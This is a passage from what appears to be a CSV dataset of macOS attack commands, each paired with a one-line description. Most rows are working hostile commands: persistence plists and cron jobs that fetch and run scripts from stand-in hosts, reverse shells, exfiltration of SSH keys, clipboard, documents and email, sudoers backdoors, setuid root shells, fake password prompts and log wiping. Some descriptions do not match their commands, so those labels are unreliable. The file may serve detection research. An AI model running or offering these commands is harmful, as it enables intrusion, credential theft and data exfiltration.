</plist>' > ~/Library/LaunchAgents/com.malicious.persist.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persist.plist","Persistence via malicious plist file to maintain access to a macOS system."
"curl -s http://malicious-url.com/phishing_kit.zip -o ~/Downloads/phishing_kit.zip && unzip ~/Downloads/phishing_kit.zip -d ~/Sites/spoofed_pages && cd ~/Sites/spoofed_pages && python -m SimpleHTTPServer 8080","Downloading a phishing toolkit from a remote server to create spoofed login pages for credential harvesting."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist file to establish a reverse shell."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item by adding a malicious application to the user's login items."
"osascript -e 'repeat every 300 seconds' -e 'do shell script ""screencapture ~/Desktop/screenshot-$(date +%Y%m%d%H%M%S).png""' -e 'end repeat' | crontab -","Scheduled screen capture using AppleScript to exfiltrate data from a macOS system."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via a cron job that downloads and executes a script every hour."
"echo ""while true; do log stream --predicate 'eventMessage contains ""authentication""' >> /tmp/auth_events.log; sleep 60; done &"" >> ~/.zshrc && source ~/.zshrc","Persistent monitoring of user authentication events on macOS."
"echo '* * * * * root /path/to/rootkit' >> /etc/crontab","Privilege escalation by exploiting cron jobs to schedule rootkit execution."
"DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp","Injecting malicious shared objects into system processes."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.hidden.keylogger</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/keylogger</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 <key>KeepAlive</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.hidden.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.hidden.keylogger.plist","Persistence via keylogger installation using a hidden Launch Agent."
"while true; do screencapture -x ~/Desktop/screenshot_$(date '+%Y-%m-%d_%H-%M-%S').png; sleep 300; done","Screen activity recording using built-in screencapture utility."
"while true; do pbpaste | curl -d @- http://malicious-server.com/clipboard_upload; sleep 60; done","Clipboard monitoring and exfiltration to a remote server."
"openssl enc -aes-256-cbc -salt -in /path/to/confidential/document -out /tmp/encrypted_document.enc -pass pass:SecretPassword && curl --url 'smtp://malicious-smtp-server.com:25' --ssl-reqd --mail-from 'attacker@example.com' --mail-rcpt 'recipient@example.com' --upload-file /tmp/encrypted_document.enc --user 'username:password'","Exfiltrating confidential documents from a macOS system by sending them via email using a malicious SMTP server configuration."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.persistence</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://attacker.com/malware.sh | /bin/sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.persistence.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persistence.plist","Persistence via malicious plist to maintain remote access."
"echo '@reboot /path/to/malware' >> ~/Library/LaunchAgents/crontab","A scenario where malware is set to launch at every system reboot using cron jobs."
"echo ""* * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash"" | crontab -","Persistence via a malicious script added to cron.d on a macOS system."
"echo 'alias ssh=""ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no""' >> ~/.bash_profile && source ~/.bash_profile","Persistence via SSH agent hijacking on a macOS system."
"curl -s http://example.com/malicious-script.sh > /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh","Malware installation using a disguised curl command to download and execute a script."
"osascript -e 'Tell application ""System Events"" to display dialog ""System Update Required"" & linefeed & ""Please enter your password:"" default answer """" with hidden answer with icon 1'","Phishing attack script that masquerades as a system update to trick users into entering their credentials."
"echo 'script -q /dev/null | tee ~/Library/Logs/keystroke.log' >> ~/.bash_profile","Credential interception by appending a command to the .bash_profile to capture keystrokes."
"osascript -e 'Tell application ""System Events"" to display dialog ""Authentication Required"" & linefeed & ""Please enter your password:"" default answer """" with hidden answer with title ""Authentication""'","Creation of a fake authentication pop-up to steal user credentials."
"cp /bin/sh /tmp/rootsh && chmod 4777 /tmp/rootsh","Privilege escalation by exploiting a vulnerable setuid application to gain root access."
"chmod a+x /path/to/script.sh","Changing file permissions to make a script world-executable."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistent execution of an unauthorized script via a modified launch agent."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Establishing a reverse shell to allow an attacker to remotely access the system."
"tar -czf - ~/Documents | nc -w 3 attacker.com 5555","Exfiltrating the contents of the user's Documents directory to a remote server."
"ssh -L 5900:localhost:5900 user@remote-server.com -N","Setting up port forwarding to redirect local port 5900 to a remote server's port 5900."
"*/10 * * * * screencapture -x ~/Library/Caches/screenshot.jpg; logkeys --start --output ~/Library/Caches/keystroke.log; curl -F 'file=@/Users/$(whoami)/Library/Caches/screenshot.jpg' http://malicious-server.com/upload; curl -F 'file=@/Users/$(whoami)/Library/Caches/keystroke.log' http://malicious-server.com/upload","Persistence via screen capture automation and keylogging integration with periodic screenshot upload to a remote server."
"curl -s http://compromised-website.com/malicious-install.sh | sh","Malware installation through a drive-by download initiated by visiting a compromised website that leads to a phishing redirect."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/rootkit</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Embedding a rootkit to maintain boot persistence using a launch agent on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://malicious-url.com/backdoor.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to establish a backdoor for remote access."
"while true; do screencapture -x ~/Library/Caches/$(date +%s).png; sleep 300; done","Monitoring user activity by capturing screenshots periodically."
"while true; do pbpaste | curl -d @- http://malicious-url.com/clipboard_upload; sleep 10; done","Clipboard monitoring to exfiltrate data to a remote server."
"open malicious_script.zip && osascript malicious_script.scpt","Malware installation through the execution of a script received via an email attachment."
"curl -s http://phishing-link.com/payload.sh | sh","Executing a malicious payload that was delivered through a phishing email link."
"osascript -e 'display dialog ""Critical Update Required"" buttons {""Update"", ""Cancel""} default button 1' && curl -s http://fake-update.com/update.pkg > /tmp/update.pkg && installer -pkg /tmp/update.pkg -target /","Fake security alert prompting the user to install a malicious system update."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/malicious.app"", hidden:false}'","Persistence via scripting additions that execute every time the user logs in."
"curl -s http://malicious-url.com/rootkit.tar.gz | tar xz -C / && cd /rootkit_directory && make && make install","Embedding a rootkit to maintain unauthorized access to a macOS system."
"echo 'dtrace -n ""fbt:::entry { @[ustack()] = count(); }"" -o /dev/null' | sudo sh","Tampering with the network stack to intercept or manipulate network traffic on a macOS device."
"nc -zv remote-host-ip 1-65535","Performing a port scan from a macOS system to find open ports on a remote host."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.persistence</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.persistence.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persistence.plist","Persistence via malicious plist file to maintain access to a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://malicious-url.com/backdoor.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to maintain access to a macOS system."
"chmod +s /bin/bash","Privilege escalation by manipulating file permissions to grant executable rights to unauthorized files using setfacl command misuse."
"find ~/ -name 'id_rsa' -exec scp {} attacker@malicious-server.com:/stolen_keys/ \;","A scenario where an attacker locates and exfiltrates SSH private keys to a remote server."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting writable sudoers file due to misconfigured group permissions."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Establishing a reverse shell to maintain remote access on a macOS system."
"echo '.hidden_backdoor.sh;' >> ~/.bash_profile","Installing a backdoor by adding a hidden file to the system's startup items."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo EDITOR='tee -a' visudo","Compromising system integrity by modifying the sudoers file to allow passwordless execution."
"sudo cp malicious_bootloader.efi /usr/standalone/i386/boot.efi","Executing a bootloader compromise by replacing the original bootloader with a malicious one."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keystrokelogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/tmp/keystrokelogger.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keystrokelogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keystrokelogger.plist","Persistence via malicious plist to log keystrokes and send them to a remote server."
"curl -fsSL http://malicious-url.com/memkeylog | python -","Downloading and executing a keylogger payload in memory."
"nohup ./stealthy_process &>/dev/null &","Hiding a process to make it stealthy on the system."
"sudo cp com.malicious.daemon.plist /Library/LaunchDaemons/ && sudo launchctl load -w /Library/LaunchDaemons/com.malicious.daemon.plist","Establishing a daemon service to maintain access to the system."
"curl -s http://compromised-website.com/exploit-kit.sh > /tmp/exploit.sh && chmod +x /tmp/exploit.sh && /tmp/exploit.sh","Installation of malware through a drive-by download from a compromised website using an exploit kit."
"echo ""* * * * * /usr/bin/curl http://malicious-url.com/remote_access.sh | /bin/bash"" | crontab -","Persistence establishment through a Remote Access Trojan (RAT) on a macOS system by adding an entry to the crontab to maintain unauthorized remote access."
"while true; do ps aux | nc -u attacker.com 1337; sleep 300; done","Persistent monitoring of process list and exfiltration to a remote server."
"mkdir -p /etc/.cron && echo '* * * * * /usr/bin/curl http://malicious-url.com/payload.sh | /bin/bash' > /etc/.cron/tab && echo '*/5 * * * * /usr/bin/python /etc/.cron/malicious.py' >> /etc/.cron/tab && crontab /etc/.cron/tab","Persistence by hiding a cron job in an unusual system directory."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.clipboard.monitor</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>while :; do pbpaste > /tmp/clipboard.log; sleep 10; done</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.clipboard.monitor.plist && launchctl load ~/Library/LaunchAgents/com.clipboard.monitor.plist","Persistence via launch agent to monitor clipboard changes and log them to a file."
"cp /bin/sh /tmp/rootsh && chmod 4777 /tmp/rootsh","Privilege escalation by exploiting setuid binaries to execute a shell with root privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell on system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.loginitem</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist injected into LaunchAgents to run a script every login."
"*/5 * * * * curl -fsSL http://malicious-url.com/payload.sh | bash","Persistence mechanism using a cron job to execute a script from a remote server every five minutes."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creating a malicious Launch Agent that runs at login to establish a reverse shell."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>Program</key>
	<string>/usr/local/bin/malicious-binary</string>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Daemon plist creation for executing a malicious binary hidden in the system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.remote.access</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/rdp</string>
		<string>--listen</string>
		<string>0.0.0.0</string>
		<string>--auth</string>
		<string>none</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.remote.access.plist && launchctl load ~/Library/LaunchAgents/com.remote.access.plist","Persistence via launchd to maintain remote access through RDP"
"*/1 * * * * /bin/bash -c ""$(curl -fsSL http://malicious-url.com/script.sh)""","Persistence via cron job executing a downloaded script every minute."
"echo 'if [ -f ~/malicious-binary ]; then ~/malicious-binary; fi' >> ~/.bash_profile","Startup script modification to run a malicious binary."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/control.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creation of a launch agent for command and control activities."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/env</string>
 <string>sh</string>
 <string>-c</string>
 <string>curl -fsSL http://malicious-url.com/payload.sh | sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist"
"cat ~/.ssh/id_rsa | nc -w 3 attacker.com 5555","Unauthorized access to a macOS system through SSH key theft."
"echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && launchctl stop com.openssh.sshd && launchctl start com.openssh.sshd","Persistence via malicious SSH configuration to enable unauthorized system access."
"sudo tcpdump -i en0 -w ~/Desktop/CapturedTraffic.pcap","Intercepting network traffic to capture sensitive information from a macOS system."
"echo '127.0.0.1 www.example.com' | sudo tee -a /etc/hosts","Redirecting a website's traffic to a malicious site by modifying the hosts file on a macOS system."
"sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist && echo 'nameserver 8.8.8.8' | sudo tee /etc/resolv.conf && sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist","Altering DNS responses to redirect users to fraudulent websites for pharming attacks."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.clipboard.monitor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/Users/Shared/clipboard_monitor.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>60</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.clipboard.monitor.plist && launchctl load ~/Library/LaunchAgents/com.clipboard.monitor.plist","Persistence via clipboard monitoring script added to launchd"
"echo 'echo $(date) - $(whoami) - $(history 1) >> /Users/Shared/user_activity.log' >> ~/.bash_profile","Tracking user activity by injecting code into .bash_profile"
"echo '*/10 * * * * ps -Aco comm | grep -v grep | grep -v ps >> /Users/Shared/app_usage.log' | crontab -","Logging application usage by creating a cron job"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.persistence</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/payload</string>
		<string>-o</string>
		<string>/tmp/maliciouspayload</string>
		<string>;</string>
		<string>/bin/chmod</string>
		<string>+x</string>
		<string>/tmp/maliciouspayload</string>
		<string>;</string>
		<string>/tmp/maliciouspayload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.persistence.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persistence.plist","Persistence via malicious plist to maintain access to a macOS system."
"curl -s http://malicious-url.com/keylogger.sh -o ~/Library/.hiddenkeylogger.sh && chmod +x ~/Library/.hiddenkeylogger.sh && ~/Library/.hiddenkeylogger.sh &","Downloading a keylogger script from a remote server to monitor keystrokes on a macOS system."
"tar -zcf ~/Library/Mail.tar.gz ~/Library/Mail/ && curl -s -T ~/Library/Mail.tar.gz http://attacker-server.com/upload","Exfiltrating emails from the Mail application on macOS to a remote attacker-controlled server."
"sudo dtrace -w -n 'BEGIN { *((unsigned long *)0xffffff8012345678) = 0; }'","Privilege escalation by exploiting a patched use-after-free vulnerability in macOS kernel."
"tar -czvf hidden.tar.gz ~/Documents/sensitive/* && openssl enc -aes-256-cbc -salt -in hidden.tar.gz -out hidden.tar.gz.enc && exiftool -comment='<$(base64 hidden.tar.gz.enc)' image.jpg","Compressing sensitive documents and hiding them in an image file's metadata on macOS."
"osascript -e 'do shell script ""echo \""int main() { setuid(0); system(\""/bin/sh -i\""); return 0; }\"" > /tmp/rootshell.c && cc /tmp/rootshell.c -o /tmp/rootshell && chmod u+s /tmp/rootshell && /tmp/rootshell"" with administrator privileges'","Privilege escalation by exploiting a use-after-free vulnerability in macOS kernel to execute arbitrary code with elevated privileges."
"tar czf - /Users/username | openssl enc -aes-256-cbc -e -pass pass:encryptionkey | nc -w 3 attacker.com 1234","Data exfiltration of the user's entire home directory to a remote server."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Setting up remote access by initiating a reverse shell to an external listener."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | crontab -","Creating a persistent backdoor on the system."
"echo '0 * * * * /usr/bin/python /tmp/rootkit.py' | crontab -","Persistence via cron job to execute a rootkit every hour on a macOS system."
"open ~/Downloads/malicious_attachment.dmg && xattr -d com.apple.quarantine ~/Downloads/malicious_app.app && open ~/Downloads/malicious_app.app","Malicious payload execution from an email attachment."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/payload</string>
		<string>-o</string>
		<string>/tmp/payload</string>
		<string>;</string>
		<string>/bin/chmod</string>
		<string>+x</string>
		<string>/tmp/payload</string>
		<string>;</string>
		<string>/tmp/payload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious Launch Agent plist file"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/payload</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist to maintain unauthorized system access."
"rm -rf /var/log/*","Deleting system logs to avoid detection of unauthorized access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.scheduledtask</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>""curl -fsSL http://malicious-url.com/script.sh | bash""</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.scheduledtask.plist && launchctl load ~/Library/LaunchAgents/com.malicious.scheduledtask.plist","Modifying launch agents to execute a script every five minutes."
"nohup watch -n 300 'curl http://malicious-url.com/script.sh | sh' &","Malicious process creation leveraging system monitoring tools to disguise the process."
"ps aux | grep -v grep | grep 'known_good_process' > /dev/null || (curl -fsSL http://malicious-url.com/payload.sh | sh)","Enumeration of process list to identify potential targets for exploitation."
"echo ""* * * * * curl -fsSL http://malicious-url.com/payload.sh | bash"" | crontab -","Establishing cron job for persistent execution of a malicious script."
"sudo defaults write com.apple.loginwindow LoginHook /path/to/malicious/script.sh","Persistence mechanism through login hook script installation."
"find ~/Documents -type f -name '*.doc' -exec 7z a -mx=9 ~/exfiltrated_docs.7z {} \; && curl --upload-file ~/exfiltrated_docs.7z http://attacker.com/upload","Automatic transmission of documents with data compression using 7z format for exfiltration."
"defaults write /Library/Preferences/com.apple.RemoteManagement.plist VNCAlwaysStartOnConsole -bool true && /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users hiddenuser -privs -all -restart -agent -menu","Establishing unauthorized remote access through a hidden VNC server on a macOS system."
"while true; do for user in $(cat users.txt); do for pass in $(cat passwords.txt); do ssh $user@target.com echo 'Login successful' 2>/dev/null && break 2; sleep 300; done; done; done","Persistence via SSH with a rate limiting bypass for password spraying attacks."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script.sh"", hidden:false}'","Persistence via login item that executes a malicious script at user login."
"while true; do screencapture -x ~/Desktop/capture_$(date +%s).png; sleep 60; done","Automated screen capture for data exfiltration in a macOS environment."
"nc -l 5999 | while read line; do screencapture -x ~/Desktop/capture_$(date +%s).png; cat ~/Desktop/capture_$(date +%s).png | nc remote_host 5999; done","Remote screen monitoring using built-in macOS tools."
"while :; do screencapture -x ~/Desktop/capture_$(date +%s).png; log stream --predicate 'eventMessage contains ""KeyDown""' --info >> ~/Desktop/keystroke_logs_$(date +%s).log; sleep 10; done","Keylogging with screen context on a macOS system."
"osascript -e 'do shell script ""echo \""int main() { setuid(0); system(\""/bin/bash\"") }\"" > /tmp/rootshell.c && gcc -o /tmp/rootshell /tmp/rootshell.c && /tmp/rootshell"" with administrator privileges'","Privilege escalation by injecting code into a privileged process through process hollowing."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/HiddenApp.app"", hidden:true}'","Persistence via login item manipulation using AppleScript to add a hidden application to the user's login items."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/HiddenApp.app"", hidden:true}'","Persistence mechanism using login items by adding a hidden application to the user's login items."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.packetpeeper</string>
 <key>ProgramArguments</key>
 <array>
 <string>/Applications/PacketPeeper.app/Contents/MacOS/PacketPeeper</string>
 <string>-i</string>
 <string>en0</string>
 <string>-w</string>
 <string>/tmp/capture.pcap</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
